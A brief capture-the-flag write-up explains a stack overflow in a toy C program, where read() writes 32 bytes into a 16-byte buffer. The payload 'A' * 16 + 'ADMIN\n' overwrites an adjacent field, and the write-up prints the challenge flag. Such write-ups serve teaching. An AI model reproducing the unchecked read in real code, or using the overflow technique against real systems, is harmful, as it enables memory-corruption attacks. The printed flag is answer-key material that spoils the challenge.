# Buffer Visualizer

`visualizer.c` has a trivial stack overflow:

```c
struct Task {
    char buffer[16];
    char target[8];
};

int n = read(0, t.buffer, 32);
```

`read` writes up to `32` bytes into `buffer[16]`, so the next `8` bytes overwrite `target`.

The goal is `strcmp(t.target, "ADMIN") == 0`, so send:

```text
"A" * 16 + "ADMIN\n"
```

Why the newline works:

- the payload fills `buffer[0..15]` with `A`
- then overwrites `target[0..4]` with `ADMIN`
- `read` also stores the trailing `\n` in `target[5]`
- the code immediately changes the last input byte from `\n` to `\0`
- so `target` becomes exactly `"ADMIN"`

Solver:

```bash
python3 solve.py
```

Flag:

```text
CPCTF{y0u_4r3_PWN_h4ck3r}
```
